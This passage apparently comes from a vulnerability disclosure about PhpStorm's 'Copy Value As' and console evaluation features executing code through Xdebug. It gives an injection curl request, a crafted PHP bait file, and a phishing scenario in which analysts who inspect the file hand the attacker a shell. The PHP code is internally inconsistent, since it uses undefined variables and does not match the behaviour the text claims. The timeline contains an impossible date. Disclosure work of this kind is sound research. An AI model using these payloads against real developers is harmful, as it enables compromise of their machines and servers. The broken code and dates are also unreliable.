### 2.2 Execute Commands via `Copy Value As`

Further research has revealed that the `COPY VALUE AS` feature (which includes `print_r`, `var_export`, and `json_encode`) in PhpStorm utilizes the `eval` command in Xdebug to execute the corresponding functions. By carefully constructing the request and code, you can execute commands on the Xdebug server again. For example:

```bash
curl "http://192.168.88.128/second_pwn.php?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%27%5d(\$b));%23" --cookie "XDEBUG_SESSION=PHPSTORM"
```

### 2.3 Research on Actual Attacks

Based on the above findings, it is possible to use PhpStorm to carry out phishing attacks. The attack process could be as follows:

1. **Malicious PHP File Discovery**: The attacker ensures that the victim can find a malicious PHP file. For instance, security researchers might share information about a webshell, or an operations team might discover suspicious PHP files on a server.
2. **Victim Analysis**: If the victim decides to analyze the PHP file using PhpStorm after a cursory review of its contents.
3. **Feature Usage**: The victim uses features such as `COPY VALUE AS (print_r/var_export/json_encode)` or `Evaluate array in Console`. These actions will execute the embedded commands.
4. **Command Execution**: The attacker can then receive a shell from the victim's Xdebug server.

Here is an example of the carefully constructed code (with the backconnect IP address being a temporarily enabled VPS):

```php
<?php
$a = array();
$q = $_GET['q'];
$a['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'] = 'system';
$b = "date >> /tmp/dawu";
$a[$q] = "aaa";
echo $a;
$c = array(
    $f => $i,
    $g => $a,
);
$n[$e]($n[$g]($n[$f]));
?>
```

Executing this PHP code directly will only run `system("echo hello world;")` multiple times. However, when the debugger does not execute the PHP code, it might extract the value of `$n[$f]` and decode the specific content using `echo XXXXXXXX | base64 -d`.

If the victim uses `COPY VALUE BY print_r` to copy the corresponding variable, the command will be executed on their Xdebug server. The following GIF illustrates this: on the left, the attacker's terminal, and on the right, the debugging session of the victim. Note: A clerical error in the GIF, “decise” should be “decide”.

### 0x03 Conclusion

The discovery of this vulnerability involved several twists and turns, which are part of the fun of security research. Unfortunately, the PhpStorm officials did not acknowledge the vulnerability. I am sharing this discovery to highlight the importance of caution when using features like `COPY VALUE AS (print_r/var_export/json_encode)` and `Evaluate array in Console` during debugging with PhpStorm.

### 0x04 Timeline

- **June 8, 2018**: Identified that `Evaluate in Console` was at risk of executing commands on the Xdebug server.
- **June 31, 2018 - July 1, 2018**: Analyzed the issues with `Evaluate in Console` and found a new exploitation point: `Copy Value`. Contacted JetBrains via `security@jetbrains.com`.
- **July 4, 2018**: Received an official reply stating that they do not provide additional access to server resources within debugging, as it is managed by Xdebug.
- **July 6, 2018**: Recontacted the official to demonstrate that the attack could be used for phishing.
- **July 6, 2018**: The official acknowledged that untrusted code on the server could compromise it without PhpStorm's involvement and agreed to disclose the problem.
- **August 16, 2018**: Disclosed the issue.
